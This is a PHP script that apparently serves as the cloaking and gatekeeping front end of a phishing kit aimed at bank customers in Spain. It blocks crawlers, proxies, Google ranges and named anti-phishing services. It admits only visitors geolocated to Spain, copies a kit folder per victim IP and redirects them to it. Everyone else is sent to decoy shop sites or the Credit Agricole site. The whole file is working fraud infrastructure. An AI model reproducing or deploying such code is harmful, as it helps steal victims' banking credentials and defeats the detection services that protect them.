<?php
error_reporting(0);
include_once "./antibots.php";
include 'visit.php';
$var3=$_SERVER['QUERY_STRING'];
$var1="msg=";
			$var2="";
			$ur=str_replace($var1,$var2,$var3, $count);
			if(isset($_GET['msg'])){
				$pg=$_GET['msg'];
			}ELSE{
				$pg='';
			}
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);

$link = array(
"https://href.li/?https://www.danicathreesixty.com",
"https://href.li/?https://www.thegldshop.com",
"https://href.li/?https://704-shop.myshopify.com",
"https://href.li/?https://corgi-overload-store.myshopify.com",
"https://href.li/?https://www.cubowl.com",
"https://href.li/?https://woolman.io",
"https://href.li/?https://store.lilbub.com",
"https://href.li/?https://www.davdev9.com",
"https://href.li/?https://shop-demure.com",
"https://href.li/?https://www.elevenmadisonpark.store",
"https://href.li/?https://faktr-store.com",
"https://href.li/?https://www.wanderlust.store");
$random = rand(0, 11);
$link = $link[$random];

function IP_TO_EARTH($ip){
$_URL         = "https://iptoearth.expeditedaddons.com/?api_key=76WC53V41LKUA461IS5Q3PBJ2H8N890ET70MDR29YFOGZX&ip=$ip"; 
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_URL, $_URL);
$content = curl_exec($ch);
$response=json_decode($content, true);
return $response;
curl_close($ch);
}
function is_base64($data){
    if (preg_match('%^[a-zA-Z0-9/+]*={0,2}$%', $data)) {
       return true;
    } else {
       return false;
    }
}
function ipbetweenrange($needle, $start, $end) {
	foreach($start as $key => $star){
	  if((ip2long($needle) >= ip2long($star)) && (ip2long($needle) <= ip2long($end[$key]))) {
		return true;
	  }
	}
  return false;
}
function visitorip() {
	 if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])){$ip = $_SERVER["HTTP_CF_CONNECTING_IP"];}
	 else if (getenv('HTTP_CLIENT_IP')){$ip = getenv('HTTP_CLIENT_IP');}
     else if(getenv('HTTP_X_FORWARDED_FOR')) {$ip = getenv('HTTP_X_FORWARDED_FOR');}
     else if(getenv('HTTP_X_FORWARDED')) {$ip = getenv('HTTP_X_FORWARDED');}
     else if(getenv('HTTP_FORWARDED_FOR')) {$ip = getenv('HTTP_FORWARDED_FOR');}
     else if(getenv('HTTP_FORWARDED')) {$ip = getenv('HTTP_FORWARDED');}
     else if(getenv('REMOTE_ADDR')) {$ip = getenv('REMOTE_ADDR');}
     else {$ip = $_SERVER['HTTP_HOST'];}
	 $ip=explode(",",$ip);
	 return $ip[0];
}
function IS_BOT_CRAWLER() {
  return (
    isset($_SERVER['HTTP_USER_AGENT'])
    && preg_match('/bot|crawl|crawler|proxy|google|slurp|spider/i', $_SERVER['HTTP_USER_AGENT'])
  );
}
function IS_BOT($ip){
	$url="http://bot.myip.ms/$ip";
	$agent            = "Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_USERAGENT, $agent);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_URL, $url);
	$res = curl_exec($ch);
	// return $res;
	curl_close($ch);
	if (strpos($res, 'Bot on this IP address') == true) {
		return true;
	}else{
		return false;
	}
}
function WHOER_NET($url){
$url="https://whoer.net/checkwhois";
$cookie_file_path = "cookies2.txt";
$agent            = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0";
$ch = curl_init(); 
$headers[] = "Accept: */*";
$headers[] = "Connection: Keep-Alive";
$headers[] = "Host: whoer.net";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);         
curl_setopt($ch, CURLOPT_USERAGENT, $agent);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_path); 
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file_path);
curl_setopt($ch, CURLOPT_URL, $url);
$fields = array(
	'partial' => "1",
	'host' => $ip
	);
$POSTFIELDS = http_build_query($fields); 
curl_setopt($ch, CURLOPT_POST, true); 
curl_setopt($ch, CURLOPT_POSTFIELDS, $POSTFIELDS); 
curl_setopt($ch, CURLOPT_URL, $url);
$res = curl_exec($ch);
	// return $res;
	curl_close($ch);
	if (strpos($res, 'Anonymous Proxy') == true) {
		return true;
	}else{
		return false;
	}
}

$ip=visitorip();
$response=IP_TO_EARTH($ip);
$victim = "./victim.txt";
$lines1 = file($victim, FILE_IGNORE_NEW_LINES);
$foundvitim = false;
foreach ($lines1 as $line1){
    if (strpos($ip,$line1) !== false){
        $foundvitim = true;
        break;
    }
}
if ($foundvitim){
		// header("location: http://shorturl.at/hnDI3");
		echo "<script>window.top.location.href = 'http://href.li/https://www.credit-agricole.fr/';</script>";
exit();
        
}
$ip=visitorip();
$response=IP_TO_EARTH($ip);
$ips = "./ips.txt";
$lines = file($ips, FILE_IGNORE_NEW_LINES);
$found = false;
foreach ($lines as $line){
    if (strpos($ip,$line) !== false){
        $found = true;
        break;
    }
}
if ($found){
		header("location: $link");
exit();
        //die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}else{
	

$ipstart = array(
"54.208.0.0",
"185.234.217.241",
"193.107.85.60",
"198.186.192.0",
"109.190.254.28",
"219.117.238.0",
"69.25.52.0",
"66.249.92.0",
"173.205.32.0",
"193.200.150.0",
"14.140.80.178",
"66.102.8.0",
"185.75.141.32",
"83.31.40.0",
"54.183.0.0",
"81.161.59.0",
"4.14.64.0",
"139.59.0.0",
"83.31.197.0",
"146.112.209.0",
"37.187.172.0",
"77.40.129.0",
"66.249.93.88",
"54.156.0.0",
"213.186.32.0",
"64.233.160.0",
"206.41.90.159",
"206.47.249.0" // dmoc1a.bell.ca
);
$ipend = array(
"54.211.255.255",
"185.234.217.245",
"193.107.85.60",
"198.186.193.255",
"109.190.254.31",
"219.117.238.255",
"69.25.60.15",
"66.249.92.255",
"173.205.33.255",
"193.200.150.255",
"14.141.1.26",
"66.102.8.137",
"185.75.141.39",
"83.31.41.255",
"54.183.255.255",
"81.161.59.255",
"4.14.65.255",
"139.59.8.35",
"83.31.197.0",
"146.112.240.255",
"37.187.173.255",
"77.40.132.127",
"66.249.93.202",
"54.167.255.255",
"213.186.43.127",
"64.233.172.199",
"206.41.90.175",
"206.47.249.255" // dmoc1a.bell.ca
);
$hostname = gethostbyaddr($ip);
$acchostsfile = "./Accepted_hosts.txt";
$acchosts = file_get_contents($acchostsfile);
$rejhostsfile = "./Rejected_hosts.txt";
$rejhosts = file_get_contents($rejhostsfile);
if(isset($_GET["email"])){
	if(is_base64($_GET["email"])){
		$email=base64_decode($_GET["email"]);
	}else{
		$email=$_GET["email"];
	}
}else{
	$email="";
}
$hosts=array("*.vodafone.pt","*.enter.it","*.tor4us.net","*.phishmongers.com","emailer1-103.thinins.net","213-18-93-130.reverse.alphalink.fr","rate-limited-proxy-66-249-92-45.google.com","209-107-196-94.ipvanish.com","m3-ipmi.ber.opendns.com","6.ip-37-187-210.eu","AAubervilliers-552-1-8-1.w90-35.abo.wanadoo.fr", "dd14822.kasserver.com","webredir.vip.gandi.net","213.214-14-84.ripe.coltfrance.com","AAubervilliers-552-1-28-239.w90-35.abo.wanadoo.fr","ip-37-187-214.eu","c5ed02-LFbn-1-4335-134.w92-169.abo.wanadoo.fr","cnil-vip-prod1.accelance.net","195.141.39.62.rev.sfr.net","dyna51.laval.jouve-hdi.com","a104-84-200-216.deploy.static.akamaitechnologies.com","xvm-161-150.dc0.ghst.net","cache.prod.vdm.ext.dila.fr","service-public-2016.fr.prod.ext.dila.fr","xvm-165-182.dc0.ghst.net","LFbn-1-4335-134.w92-169.abo.wanadoo.fr","clu106.neoplus.adsl.tpnet.pl","blue3057.server-cp.com","ec2-54-211-193-207.compute-1.amazonaws.com","mta141032.isitphishing.org","mail.phishing-initiative.eu","crawl-112-170-187-194.qwant.com","mail.dev.phishing-initiative.net","84-52-15-51.rev.cloud.scaleway.com","11-46-15-51.rev.cloud.scaleway.com","crawl-109-170-187-194.qwant.com","174-46-15-51.rev.cloud.scaleway.com","68-233-47-212.rev.cloud.scaleway.com","c2ce4d39.fsp.oleane.fr","198-89-15-51.rev.cloud.scaleway.com","host190-124-61-217.static.arubacloud.com","mail.avranches.fr","cache.google.com","*.ovh.net","dd14822.kasserver.com","webredir.vip.gandi.net","213.214-14-84.ripe.coltfrance.com","AAubervilliers-552-1-28-239.w90-35.abo.wanadoo.fr","ip-37-187-214.eu","c5ed02-LFbn-1-4335-134.w92-169.abo.wanadoo.fr","cnil-vip-prod1.accelance.net","195.141.39.62.rev.sfr.net","dyna51.laval.jouve-hdi.com","a104-84-200-216.deploy.static.akamaitechnologies.com","xvm-161-150.dc0.ghst.net","cache.prod.vdm.ext.dila.fr","service-public-2016.fr.prod.ext.dila.fr","xvm-165-182.dc0.ghst.net","LFbn-1-4335-134.w92-169.abo.wanadoo.fr","clu106.neoplus.adsl.tpnet.pl","blue3057.server-cp.com","ec2-54-211-193-207.compute-1.amazonaws.com","mta141032.isitphishing.org","mail.phishing-initiative.eu");
if(!IS_BOT_CRAWLER() && !IS_BOT($ip) && !WHOER_NET($url) && !in_array($hostname, $hosts) && !ipbetweenrange($hostname, $ipstart, $ipend) && $response["country_code"] == "ES"){
	if(false === strpos($acchosts,$hostname)) {
    file_put_contents($acchostsfile,"$hostname\n",FILE_APPEND);
	}
	$random=rand(0,100000);
	$md5=md5("$random");
	$base=base64_encode($md5);
	$dst=$ip;
	$pg=$_GET['msg'];
	$dst = substr($dst, 0, 7);
	$dst=$ip;
	function recurse_copy($src,$dst) {
		$dir = opendir($src); 
		@mkdir($dst); 
		while(false !== ( $file = readdir($dir)) ) {
			if (( $file != '.' ) && ( $file != '..' )) { 
				if ( is_dir($src . '/' . $file) ) {
					recurse_copy($src . '/' . $file,$dst . '/' . $file);
                    chmod($dst."/".$file, 0755);					
				}else { 
					copy($src . '/' . $file,$dst . '/' . $file); 
					chmod($dst."/".$file, 0755);
				}
			}
		} 
		closedir($dir);
	} 
	$src="z0n51";
	recurse_copy( $src, $dst );
	header("location:".$dst."/index.php?ip=".$dst."");
}else{
	if(false === strpos($rejhosts,$hostname)) {
    file_put_contents($rejhostsfile,"$hostname\n",FILE_APPEND);
    file_put_contents($ips,"$ip\n",FILE_APPEND);
	}
		header("location: $link");
exit();
}
	
	
}
?>